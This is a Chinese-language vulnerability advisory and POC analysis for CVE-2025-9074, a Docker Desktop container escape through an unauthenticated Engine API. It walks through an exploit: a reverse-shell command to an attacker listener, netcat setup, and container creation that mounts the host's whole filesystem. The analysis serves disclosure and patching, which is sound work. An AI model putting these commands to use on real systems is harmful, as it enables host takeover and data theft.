## CVE-2025-9074 - Docker Desktop 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** Docker Desktop < 4.44.3

**利用条件:** 攻击者需已在本地运行恶意Linux容器，且可访问Docker Engine API（默认子网192.168.65.7:2375），无需认证。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074代表了一个严重的容器逃逸和未经授权访问漏洞，影响Windows和macOS操作系统上的Docker Desktop安装。Docker Desktop作为开发者广泛使用的应用，提供了在本地构建、运行和管理Linux容器的便捷环境。这个严重缺陷允许已在脆弱Docker Desktop实例上执行的恶意Linux容器，有效绕过旨在隔离容器与宿主系统的复杂隔离机制。漏洞的根本原因在于Docker Engine API在默认的内部子网（特别是192.168.65.7:2375）上被无意中暴露，且未要求任何形式的认证。这种错误配置为攻击者创造了直接的通道。一旦攻击者在宿主机的任何容器中获得了初步代码执行权限，他们就可以轻松利用这种未经认证的API访问。这种访问使他们能够执行高度特权的操作，例如创建具有任意配置和升级宿主级权限的新容器。最终，这会导致底层宿主机的完全妥协，有效地将权限从容器化环境升级到完全的宿主控制。其后果不仅限于容器逃逸，还延伸到本地权限提升（LPE），赋予攻击者不受限制的文件系统访问权限、任意命令执行能力，以及潜在的宿主持久访问。这个关键漏洞由安全研究员Felix Boulet独立发现，他注意到其他虚拟机软件中的类似漏洞并将其洞察力应用于Docker。该漏洞已被分配了9.3的CVSS评分（基于其影响，CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H），突显了其严重的威胁等级。Docker认识到其严重性，已在2025年8月20日发布的Docker Desktop 4.44.3版本中修复了此漏洞。强烈建议组织和个人用户将其Docker Desktop安装更新到此版本或更高版本，以降低风险。

**POC有效性分析:**
提供的`CVE-2025-9074.sh`脚本是一个**高度有效且功能完备的漏洞验证（POC）**，它清晰地展示了Docker Desktop容器逃逸漏洞的严重性及其对宿主系统的潜在威胁。该脚本的设计巧妙且直观，能够直接利用漏洞，实现宿主系统的全面沦陷。其核心原理是利用了脆弱版本的Docker Desktop在内部网络接口（例如`192.168.65.7:2375`）上暴露Docker Engine API时未进行认证的缺陷。这种未认证的访问使得任何能够触及该内部网络的恶意容器都能与Docker守护进程进行交互，并发出特权命令。

脚本执行时，首先通过`curl -s "http://${IP}:${PORT}/images/json"`向可访问的Docker Engine API查询并获取可用的Docker镜像列表。这一步是确保POC通用性和健壮性的关键。通过动态地选择第一个找到的镜像的`RepoTags`作为恶意容器的基础镜像，脚本避免了硬编码特定镜像名称可能导致的问题，确保了后续容器创建命令的有效性，即使不同环境下的具体镜像配置有所差异也能成功。这种灵活性使得POC在多种Docker Desktop部署场景下都能有效运行。

此POC的精妙之处在于它精心构造的JSON payload，该payload随后被发送到未认证的Docker Engine API的`/containers/create`端点。这个payload是专门设计用来创建一个具有高度特权的容器，从而实现容器逃逸。首先，JSON中的`Cmd`字段被设置为执行一个标准的、广泛使用的反向shell命令：`bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1`。这个命令在容器启动时会立即尝试与攻击者控制的监听器建立连接，从而提供一个稳定且交互式的命令行访问宿主机的入口。

其次，也是最关键的、用于实现完整容器逃逸和宿主接管的部分，是`HostConfig.Binds`参数的利用。该参数是Docker API中允许将宿主机的目录直接挂载到新创建的容器中的功能。脚本包含了两个关键的挂载点，以适应不同的操作系统环境：`"/mnt/host/c:/host_root_win"`用于基于Windows的Docker Desktop环境（它将宿主机的`C:`盘完整映射到容器内部的`/host_root_win`目录），以及`"/:/host_root_nix"`用于macOS和Linux的Docker Desktop设置（它将宿主机的整个根文件系统映射到容器内部的`/host_root_nix`目录）。这些极具特权的挂载有效地绕过了容器的隔离边界，赋予了攻击者控制的容器对宿主机整个文件系统的完全读写权限。这意味着攻击者不仅可以访问敏感数据，还可以修改系统配置、植入恶意程序或部署持久化机制。

最后，在成功创建恶意容器后，脚本会向`http://${IP}:${PORT}/containers/${ID}/start`发送一个POST请求，以启动该容器。这一系列自动化操作最终使攻击者在宿主系统上获得一个反向shell，并能够通过挂载的目录（如`/host_root_nix`或`/host_root_win`）完全控制宿主机的文件系统。脚本清晰的结构、对常用系统工具（`curl`、`bash`）的依赖、以及通过未经认证的Docker Engine API直接演示宿主机攻陷，都凸显了其作为CVE-2025-9074 POC的高效性和可靠性。需要强调的是，其有效性取决于攻击者已在目标Docker Desktop实例上的**任何容器内**获得初步执行权限，并且该容器能够通过网络访问Docker Engine API。

**利用步骤:**
1.  **初步访问：** 攻击者首先需要在运行脆弱Docker Desktop实例的任何Docker容器内获得代码执行权限。这可能通过另一个容器内部的应用程序漏洞实现，或者诱导用户运行恶意容器。
2.  **网络访问验证：** 从已受控的容器内部，攻击者需验证能否连接到Docker Engine API端点，通常是`http://192.168.65.7:2375`。在脆弱的Docker Desktop版本中，该端点在内部通常是未经认证而暴露的。
3.  **设置监听器：** 在攻击者自己的机器上，设置一个netcat监听器来接收反向shell连接，例如执行`nc -lvnp 9002`。
4.  **执行POC：** 将`CVE-2025-9074.sh`脚本传输到已受控的容器内部。然后，使用Docker Engine的IP/端口以及攻击者的监听主机IP/端口执行脚本，例如：`sh CVE-2025-9074.sh 192.168.65.7 2375 <攻击者_IP> 9002`。
5.  **宿主控制：** 脚本执行后将进行以下操作：
    *   查询Docker Engine上可用的镜像。
    *   构造一个JSON payload来创建新容器。此payload包含一个用于发起反向shell的命令，并将宿主机的根文件系统（例如Linux/macOS上的`/`，Windows上的`C:`）挂载到新容器中。
    *   创建并启动这个新的、拥有特权的容器。
    *   反向shell将连接回攻击者的监听器，提供一个能够通过挂载目录（如`/host_root_nix`或`/host_root_win`）访问宿主机文件系统，并可能进一步提升宿主级别权限的shell。

**投毒风险分析:**
`CVE-2025-9074.sh`脚本展现出**低投毒风险**。该脚本以纯粹的shell脚本编写，其内容易于阅读和理解。脚本中没有使用代码混淆、加密或复杂的逻辑来隐藏除漏洞利用本身以外的任何恶意意图。

此脚本主要依赖于`curl`工具进行Docker Engine API交互，以及`bash`用于命令执行，这两者都是Linux环境中常见的标准实用程序。脚本不会从远程源下载或执行任何外部的、不受信任的脚本或二进制文件。

脚本中所谓的“恶意”部分主要指反向shell命令（`bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1`）和宿主机文件系统挂载（`"Binds":["/mnt/host/c:/host_root_win","/:/host_root_nix"]}`）。这些都是漏洞利用的直接且透明的组成部分，旨在演示漏洞的实际影响。它们并未被隐藏或伪装成良性功能。

脚本的行为完全可预测，并直接符合演示容器逃逸的目的。它仅与指定的Docker Engine API以及攻击者的监听器进行交互。没有迹象表明存在意外的副作用、向未知目的地的数据外泄，或在获得反向shell之外安装持久性后门。

尽管此POC本身携带投毒的风险较低，但用户在执行任何POC代码时仍应保持警惕。在使用任何涉及网络请求或系统修改的POC之前，务必进行代码审查。就本例而言，脚本的透明性使其易于验证其仅执行所描述的容器逃逸和反向shell操作。组织应优先修补脆弱的Docker Desktop版本，以从根本上缓解此漏洞。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
